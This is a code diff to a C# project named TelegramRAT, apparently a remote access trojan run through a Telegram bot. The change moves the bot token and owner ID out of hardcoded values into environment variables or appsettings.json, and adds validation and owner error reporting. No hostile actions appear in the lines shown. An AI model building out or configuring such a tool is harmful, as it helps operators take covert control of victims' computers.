@@ -7,15 +7,19 @@ using System.Diagnostics;
 using Telegram.Bot.Types;
 using Telegram.Bot;
 using System.Net;
+using System.Text.Json;
 
 namespace TelegramRAT;
 
 public static class Program
 {
-    private static readonly string BotToken = "YOUR_TELEGRAM_BOT_TOKEN";
-    private static readonly long? OwnerId = null;
+    private const string BotTokenEnvironmentVariable = "TELEGRAMRAT_BOT_TOKEN";
+    private const string OwnerIdEnvironmentVariable = "TELEGRAMRAT_OWNER_ID";
 
-    public static readonly TelegramBotClient Bot = new TelegramBotClient(BotToken);
+    private static string BotToken = string.Empty;
+    private static long OwnerId;
+
+    public static TelegramBotClient Bot { get; private set; } = null!;
     public static readonly List<BotCommand> Commands = new();
     private const int PollingDelay = 1000;
 
@@ -27,19 +31,25 @@ public static class Program
             return;
         }
 
+        if (!TryInitializeConfiguration(out var configurationErrorMessage))
+        {
+            Console.Error.WriteLine(configurationErrorMessage);
+            return;
+        }
+
         try
         {
             await RunAsync();
         }
         catch (Exception ex)
         {
-            if (OwnerId != 0)
+            if (OwnerId > 0)
             {
-                await ReportExceptionAsync(new Message { Chat = new Chat { Id = (long)OwnerId } }, ex);
+                await ReportExceptionAsync(new Message { Chat = new Chat { Id = OwnerId } }, ex);
 
                 if (ex.InnerException?.Message.Contains("Conflict: terminated by other getUpdates request") == true)
                 {
-                    await SendErrorAsync(new Message { Chat = new Chat { Id = (long)OwnerId } }, new Exception("Only one bot instance can be online at the same time."));
+                    await SendErrorAsync(new Message { Chat = new Chat { Id = OwnerId } }, new Exception("Only one bot instance can be online at the same time."));
                     return;
                 }
 
@@ -53,6 +63,93 @@ public static class Program
             Commands.Clear();
             await Main(args);
         }
+    }
+
+    private static bool TryInitializeConfiguration(out string errorMessage)
+    {
+        var (botTokenValue, ownerIdValue, configurationSourceDescription) = LoadConfiguration();
+
+        if (string.IsNullOrWhiteSpace(botTokenValue))
+        {
+            errorMessage =
+                "BotToken was not provided. Set the TELEGRAMRAT_BOT_TOKEN environment variable or add it to appsettings.json.";
+            return false;
+        }
+
+        if (!long.TryParse(ownerIdValue, out var ownerId) || ownerId <= 0)
+        {
+            errorMessage =
+                "OwnerId was not provided or is invalid. Set the TELEGRAMRAT_OWNER_ID environment variable or add a numeric value to appsettings.json.";
+            return false;
+        }
+
+        BotToken = botTokenValue;
+        OwnerId = ownerId;
+        Bot = new TelegramBotClient(BotToken);
+
+        Console.WriteLine($"TelegramRAT starting. Configuration source: {configurationSourceDescription}. Owner chat ID: {OwnerId}.");
+
+        errorMessage = string.Empty;
+        return true;
+    }
+
+    private static (string? BotToken, string? OwnerId, string ConfigurationSourceDescription) LoadConfiguration()
+    {
+        string? botToken = Environment.GetEnvironmentVariable(BotTokenEnvironmentVariable);
+        string? ownerId = Environment.GetEnvironmentVariable(OwnerIdEnvironmentVariable);
+
+        var configurationSources = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+
+        if (!string.IsNullOrWhiteSpace(botToken) || !string.IsNullOrWhiteSpace(ownerId))
+        {
+            configurationSources.Add("environment variables");
+        }
+
+        var configurationFilePath = Path.Combine(AppContext.BaseDirectory, "appsettings.json");
+        if (File.Exists(configurationFilePath))
+        {
+            try
+            {
+                using var document = JsonDocument.Parse(File.ReadAllText(configurationFilePath));
+                var root = document.RootElement;
+
+                if (root.TryGetProperty("BotToken", out var botTokenElement))
+                {
+                    var candidate = botTokenElement.GetString();
+                    if (!string.IsNullOrWhiteSpace(candidate) && string.IsNullOrWhiteSpace(botToken))
+                    {
+                        botToken = candidate;
+                        configurationSources.Add("appsettings.json");
+                    }
+                }
+
+                if (root.TryGetProperty("OwnerId", out var ownerIdElement))
+                {
+                    var candidate = ownerIdElement.GetString();
+                    if (!string.IsNullOrWhiteSpace(candidate) && string.IsNullOrWhiteSpace(ownerId))
+                    {
+                        ownerId = candidate;
+                        configurationSources.Add("appsettings.json");
+                    }
+                }
+            }
+            catch (JsonException ex)
+            {
+                Console.Error.WriteLine($"Failed to read configuration from appsettings.json: {ex.Message}");
+            }
+            catch (IOException ex)
+            {
+                Console.Error.WriteLine($"Failed to access appsettings.json: {ex.Message}");
+            }
+        }
+
+        if (configurationSources.Count == 0)
+        {
+            configurationSources.Add("no configuration source detected");
+        }
+
+        var configurationSourceDescription = string.Join(" & ", configurationSources.OrderBy(source => source));
+        return (botToken, ownerId, configurationSourceDescription);
     }
 
     private static async Task RunAsync()
